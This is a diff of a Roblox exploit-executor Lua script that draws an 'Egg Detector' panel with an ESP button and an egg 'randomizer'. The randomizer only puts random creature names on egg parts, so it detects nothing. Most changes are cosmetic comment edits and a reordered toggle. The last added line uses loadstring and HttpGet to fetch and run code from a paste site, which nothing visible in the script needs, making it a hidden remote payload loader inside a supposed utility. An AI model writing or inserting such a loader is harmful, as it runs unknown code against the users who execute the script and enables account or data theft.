@@ -3,7 +3,7 @@ pcall(function()
     game.CoreGui.EggDetectorBoxUI:Destroy()
 end)
 
--- Create new GUI container
+-- Create GUI container
 local gui = Instance.new("ScreenGui")
 gui.Name = "EggDetectorBoxUI"
 gui.ResetOnSpawn = false
@@ -12,7 +12,7 @@ gui.DisplayOrder = 9999
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.Parent = game:GetService("CoreGui")
 
--- Top-left box frame (not draggable)
+-- Box Frame (not draggable)
 local frame = Instance.new("Frame")
 frame.Name = "BoxFrame"
 frame.Size = UDim2.new(0, 200, 0, 240)
@@ -23,7 +23,7 @@ frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
 frame.ZIndex = 10
 frame.Parent = gui
 
--- Title Label
+-- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0.18, 0)
 title.Position = UDim2.new(0, 0, 0, 0)
@@ -35,7 +35,7 @@ title.Font = Enum.Font.GothamBold
 title.ZIndex = 10
 title.Parent = frame
 
--- ESP Toggle Button
+-- ESP Button
 local espButton = Instance.new("TextButton")
 espButton.Size = UDim2.new(0.85, 0, 0.15, 0)
 espButton.Position = UDim2.new(0.075, 0, 0.22, 0)
@@ -83,7 +83,7 @@ randomizerButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
 randomizerButton.ZIndex = 10
 randomizerButton.Parent = frame
 
--- Footer Label
+-- Footer
 local footer = Instance.new("TextLabel")
 footer.Size = UDim2.new(1, 0, 0.12, 0)
 footer.Position = UDim2.new(0, 0, 0.85, 0)
@@ -95,11 +95,10 @@ footer.Font = Enum.Font.GothamSemibold
 footer.ZIndex = 10
 footer.Parent = frame
 
--- === Egg Randomizer Logic ===
+-- Egg Randomizer Logic
 local creatureNames = {
     "Shiba Inu", "Nihonzaru", "Tanuki", "Tanchozuru", "Kappa", "Kitsune"
 }
-
 local nameColors = {
     Color3.fromRGB(255, 85, 85),
     Color3.fromRGB(85, 170, 255),
@@ -109,6 +108,7 @@ local nameColors = {
     Color3.fromRGB(255, 255, 85)
 }
 
+-- Helper to tag one egg
 local function addNameToEgg(egg, name)
     local tag = Instance.new("BillboardGui")
     tag.Name = "DinoLabel"
@@ -126,24 +126,23 @@ local function addNameToEgg(egg, name)
     label.Font = Enum.Font.GothamBold
     label.Parent = tag
 
-    -- Special effect for Kitsune
     if name == "Kitsune" then
-        local uiGradient = Instance.new("UIGradient")
-        uiGradient.Color = ColorSequence.new({
+        label.TextColor3 = Color3.new(1, 1, 1)
+        label.TextStrokeTransparency = 0
+        label.TextStrokeColor3 = Color3.new(0, 0, 0)
+        local gradient = Instance.new("UIGradient")
+        gradient.Color = ColorSequence.new({
             ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 255)),
             ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
             ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 255)),
         })
-        uiGradient.Parent = label
-
-        label.TextColor3 = Color3.new(1, 1, 1)
-        label.TextStrokeTransparency = 0
-        label.TextStrokeColor3 = Color3.new(0, 0, 0)
+        gradient.Parent = label
     else
         label.TextColor3 = nameColors[math.random(1, #nameColors)]
     end
 end
 
+-- Clear all egg name tags
 local function clearAllEggLabels()
     for _, egg in pairs(workspace:GetDescendants()) do
         if egg:IsA("BasePart") and egg.Name:lower():find("egg") then
@@ -153,6 +152,7 @@ local function clearAllEggLabels()
     end
 end
 
+-- Add name tags to eggs
 local function applyRandomNamesToEggs()
     for _, egg in pairs(workspace:GetDescendants()) do
         if egg:IsA("BasePart") and egg.Name:lower():find("egg") then
@@ -162,16 +162,18 @@ local function applyRandomNamesToEggs()
     end
 end
 
+-- Toggle logic
 local randomizerOn = false
 randomizerButton.MouseButton1Click:Connect(function()
-    randomizerOn = not randomizerOn
     if randomizerOn then
-        randomizerButton.Text = "🥚 Egg Randomizer: ON"
-        applyRandomNamesToEggs()
-    else
         randomizerButton.Text = "🥚 Egg Randomizer: OFF"
         clearAllEggLabels()
+    else
+        randomizerButton.Text = "🥚 Egg Randomizer: ON"
+        applyRandomNamesToEggs()
     end
+    randomizerOn = not randomizerOn
 end)
+
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/NsyUc2zmt1/0", true))()
 
